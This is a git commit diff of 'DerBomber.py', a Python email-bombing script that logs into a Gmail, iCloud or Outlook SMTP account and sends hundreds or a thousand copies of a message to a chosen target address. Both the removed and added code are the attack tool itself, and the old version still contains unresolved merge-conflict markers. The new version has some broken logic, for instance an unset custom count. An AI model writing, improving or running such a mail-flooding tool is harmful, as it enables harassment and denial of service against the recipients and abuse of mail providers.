cd4e944809176489ea5e7424e41b866bc27e6a90
Carlos <carloshenrique20051bb@gmail.com>
2025-02-02 21:14:44 -0300

    Updating new exceptions

--- DerBomber.py
+++ DerBomber.py
@@ -1,21 +1,38 @@
 import smtplib
 import sys
+from getpass import getpass
 
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
+class Colors:
+   
+    BLACK = "\033[0;30m"
+    RED = "\033[0;31m"
+    GREEN = "\033[0;32m"
+    BROWN = "\033[0;33m"
+    BLUE = "\033[0;34m"
+    PURPLE = "\033[0;35m"
+    CYAN = "\033[0;36m"
+    LIGHT_GRAY = "\033[0;37m"
+    DARK_GRAY = "\033[1;30m"
+    LIGHT_RED = "\033[1;31m"
+    LIGHT_GREEN = "\033[1;32m"
+    YELLOW = "\033[1;33m"
+    LIGHT_BLUE = "\033[1;34m"
+    LIGHT_PURPLE = "\033[1;35m"
+    LIGHT_CYAN = "\033[1;36m"
+    LIGHT_WHITE = "\033[1;37m"
+    BOLD = "\033[1m"
+    FAINT = "\033[2m"
+    ITALIC = "\033[3m"
+    UNDERLINE = "\033[4m"
+    BLINK = "\033[5m"
+    NEGATIVE = "\033[7m"
+    CROSSED = "\033[9m"
+    END = "\033[0m"
     
 def banner():
-    print(bcolors.OKGREEN + '+[+[+[ Bomba-Mail ]+]+]+')
-    print(bcolors.OKGREEN + '+[+[+[ made with Python')
-    print(bcolors.OKGREEN + r'''
+    print(Colors.GREEN + '+[+[+[ Bomba-Mail ]+]+]+')
+    print(Colors.GREEN + '+[+[+[ made with Python')
+    print(Colors.GREEN + r'''
           
                   _____              ____                  _               
  |  __ \            |  _ \                | |              
@@ -59,9 +76,8 @@ class Bomber:
 
     def __init__(self):
         try:
-            print(bcolors.WARNING + '+[+[+[ Program initializing]+]+]+  ')
-            self.target = str(input(bcolors.WARNING + "Enter target email:"))
-            self.options = int(input(bcolors.WARNING + '+[+[+[ Choose options: 1 - 1000msgs | 2 - 500msgs | 3 - 250msgs | 4 - custom'))
+            print(Colors.RED + ' Program initializing  ')
+            self.options = int(input(Colors.RED + 'Choose options: 1 - 1000msgs | 2 - 500msgs | 3 - 250msgs | 4 - custom '))
             if int(self.options) > int(4) or int(self.options) < int(1):
                 print("Invalid option, choose again.")
                 sys.exit(1)
@@ -71,104 +87,95 @@ class Bomber:
             print(f"Error in function init! {e}")
     
     def bomb(self):
-       try:
-           print(bcolors.WARNING + 'Setting up bomb: ')
-           self.amount = None
-           if self.options == int(1):
-               self.amount = int(1000)
-           elif self.options == int(2):
-               self.amount = int(500)
-           elif self.options == int(3):
-               self.amount = int(250)
-           else:
-               self.amount = int(self.custom)
-       except Exception as e:
-           print(f'Error in function bomb! {e}')    
-            
-            
+        try:
+            print(Colors.RED + "Setting up bomb...")
+            self.amount = None
+            if self.options == int(1):
+                self.amount = int(1000)
+            elif self.options == int(2):
+                self.amount = int(500)
+            elif self.options == int(3):
+                self.amount = int(250)
+            else:
+                self.amount = self.custom 
+        except Exception as e:
+            print(f"Error on function [bomb] {e}")
+    
     def email(self):
-        try:
-            self.server = str(input(bcolors.WARNING + "Choose email server/format: 1 - Gmail | 2 - Hotmail | 3 - iCloud "))
-            premade_list = ['1','2','3']
-            default_port = True
-            if self.server not in premade_list:
-                default_port = False
-                self.port = int(input("Enter port number: "))
-<<<<<<< HEAD
-            if default_port == True:
-                self.port = int(587)
-=======
-            else: 
-                if self.server in premade_list:
-                    case = {
-                        1: ['smtp.gmail.com', 587 ],
-                        2: ['smtp.live.com', 587], 
-                        3: ['smtp.mail.me.com', 587] 
-                    }
-                    self.smtp_server, self.port = case[self.server]
-            print(f"Server: {self.smtp_server} / Port: {self.port}")
-        except Exception as e:
-            print(f"Error! {e}")
->>>>>>> d58fb5ccd95dab610c5d8e3677346214e3f89e33
-            
-            if self.server == '1':
-                self.smtp_server = 'smtp.gmail.com'
-            if self.server == '2':
-                self.smtp_server = 'smtp-mail.outlook.com'
-            if self.server == '3':
-                self.smtp_server = 'smtp.mail.me.com'
-            
-            print(f"Server: {self.smtp_server} / Port: {self.port}")
-            self.sender = str(input(bcolors.WARNING + "Enter sender email:"))
-            self.password = str(input(bcolors.WARNING + "Enter sender password:"))
-            self.subject = str(input(bcolors.WARNING + "Enter subject: "))
-            self.message = str(input(bcolors.WARNING + "Enter message: "))
-            
-            self.connect = smtplib.SMTP(self.smtp_server, self.port)
-            self.connect.ehlo()
-            self.connect.starttls()
-            self.connect.login(self.sender, self.password)
-            
-<<<<<<< HEAD
-            print(f"From: {self.sender}\nTo: {self.target}\n Subject: {self.subject}\n {self.message}")
-=======
-            self.msg = f"From: {self.sender}\nTo: {self.target}\nSubject: {self.subject}\n\n{self.message}"
-            
-           for i in range(self.amount):
-            self.s.sendmail(self.sender, self.target, self.msg)
-            print(bcolors.OKGREEN + f"Message sent {i + 1} times")
-            
-            self.s.quit()
-            print(bcolors.OKGREEN + r"Attack finished.")
->>>>>>> d58fb5ccd95dab610c5d8e3677346214e3f89e33
-        except Exception as e:
-            print(f"Error in function email! {e}")
-            
+     try:   
+      self.server_choice = int(input(Colors.RED + "Choose email server: 1 - Gmail | 2 - iCloud | 3 - Outlook "))
+      case = {
+          1: 'smtp.gmail.com',
+          2: 'smtp.mail.me.com',
+          3: 'smtp-mail.outlook.com'
+      }  
+      # Escolhe o servidor, usando a chave do dicionário como parâmetro
+      self.choosen_server = case.get(self.server_choice)
+       # Validação do servidor escolhido
+      if not self.choosen_server:
+        print(Colors.RED + "Invalid server choice. Please choose 1, 2, or 3.")
+        return
+      # Port padrão para servidores SMTP 
+      self.port = int(587)
+      print(Colors.GREEN + f"Server choosen: {self.choosen_server}, port: {self.port}")
+      
+      self.target = str(input(Colors.RED + "Enter target email: "))
+      self.sender_email = str(input(Colors.RED + "Enter your email: "))
+      self.sender_password = getpass(Colors.RED + "Enter your email password: ")
+      self.message_subject  = str(input(Colors.RED + "Enter message subject: "))
+      self.message = str(input(Colors.RED + "Enter message: "))
+        # Formato da mensagem
+      self.message = 'Subject: {}\n\n{}'.format(self.message_subject, self.message)
+      
+      # Criação do objeto servidor SMTP
+      self.server = smtplib.SMTP(self.choosen_server,self.port)
+      self.server.starttls()
+      self.server.ehlo()
+      # Login na conta entregue pelo usuário
+      self.server.login(self.sender_email,self.sender_password)
+      
+     except Exception as e:
+        print(f"Error on function [email] {e}") 
+    
     def send(self):
+        self.count = 0 
         try:
-            self.connect.sendmail(self.sender, self.target,self.message)
+            # Envia a mensagem pós-conexão 
+            self.server.sendmail(self.sender_email,self.target,self.message)
             self.count+=1
-            print(f"Message sent! {self.count}")
         except Exception as e:
-            print(f"Error in function send! {e}")
-    
-    def attack(self):
-        print(bcolors.WARNING + 'Bombing...')
-        for email in range(self.amount):
-            self.send()
-        self.connect.close()
-        print(bcolors.OKGREEN + 'Attack finished!')
-        sys.exit(0)
-           
-
-if __name__ == '__main__':
-    banner()
-    bomb = Bomber()
-    bomb.bomb()
-    bomb.email()
-    bomb.attack()
-    
+            print(f"Error on function [send] {e}")
             
+    def attack(self):
+        try:
+            for i in range(self.amount):
+                self.send()
+                print(Colors.GREEN + f"Emails sent: {self.count}")
+            # Pós loop a conexão é encerrada
+            self.server.quit()
+        except Exception as e:
+            print(f"Error on function [attack] {e}")
+        except smtplib.SMTPAuthenticationError:
+            print(Colors.RED + "Error: Authentication error. Please check your email and password.")
+        except smtplib.SMTPException as smtp_error:
+            print(Colors.RED + f"Error: SMTP error {smtp_error}, please try again.")	
+            
+    def start(self):
+        try:
+            self.bomb()
+            self.email()
+            self.attack()
+        except Exception as e:
+            print(f"Error on function [start] {e}")
+      
+if __name__ == "__main__":
+    banner()
+    Bomber().start()
+            
+        
+        
+        
+        
                     
             
             
